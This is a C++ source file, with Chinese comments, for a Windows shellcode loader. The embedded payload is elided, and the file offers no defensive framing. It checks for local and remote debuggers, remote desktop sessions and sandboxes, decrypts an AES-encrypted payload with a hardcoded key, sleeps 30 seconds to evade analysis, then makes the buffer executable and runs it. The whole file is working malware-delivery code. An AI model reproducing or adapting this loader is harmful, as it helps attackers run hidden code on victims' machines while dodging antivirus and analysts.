#include <iostream>
#include <openssl/evp.h>
#include <openssl/err.h>
#include<Windows.h>
#include <chrono>
#include <thread>
using namespace std;

// aes加密后的shelllcode
unsigned char lpAddress[] = "\xd0...";

unsigned char* aes_decrypt(const unsigned char* ciphertext, int ciphertext_len,
    const unsigned char* key, const unsigned char* iv,
    int* plaintext_len)
{
    EVP_CIPHER_CTX* ctx;
    int len;
    unsigned char* plaintext;

    // 分配空间
    plaintext = new unsigned char[ciphertext_len];

    // 创建并初始化上下文
    ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);

    // 执行解密操作
    EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len);
    *plaintext_len = len;

    // 完成解密操作
    EVP_DecryptFinal_ex(ctx, plaintext + len, &len);
    *plaintext_len += len;

    // 清理上下文并返回解密后的数据
    EVP_CIPHER_CTX_free(ctx);
    return plaintext;
}

bool detect_sandbox() {
    bool is_sandbox = false;
    auto start_time = chrono::high_resolution_clock::now();

    this_thread::sleep_for(chrono::milliseconds(100));

    auto end_time = chrono::high_resolution_clock::now();
    auto elapsed_time = chrono::duration_cast<chrono::milliseconds>(end_time - start_time);

    cout << elapsed_time.count() << endl;
    if (elapsed_time.count() < 100) {
        is_sandbox = true;
    }

    return is_sandbox;
}


int main() {
    if (IsDebuggerPresent()) {
        cout << "调试器检测到当前程序" << endl;
        return 1;
    }

    BOOL bDebuggerPresent = FALSE;
    if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebuggerPresent) && bDebuggerPresent) {
        cout << "远程调试器检测到当前程序" << endl;
        return 1;
    }

    if (GetSystemMetrics(SM_REMOTESESSION) != 0) {
        cout << "当前程序正在远程桌面会话中" << endl;
        return 1;
    }

    if (detect_sandbox()) {
        cout << "This program may be running in a sandbox!" << endl;
        return 1;
    }

    unsigned char key[] = "12345678901234567890123456789012";
    unsigned char iv[] = "1234567890123456";
    int plaintext_length = 0;
    unsigned char* s = aes_decrypt(lpAddress, sizeof lpAddress - 1, key, iv, &plaintext_length);

    Sleep(30000);

    DWORD lpflOldProtect;
    VirtualProtect(s, plaintext_length, PAGE_EXECUTE_READWRITE, &lpflOldProtect);
    ((VOID(*)()) s)();
    return 0;
}
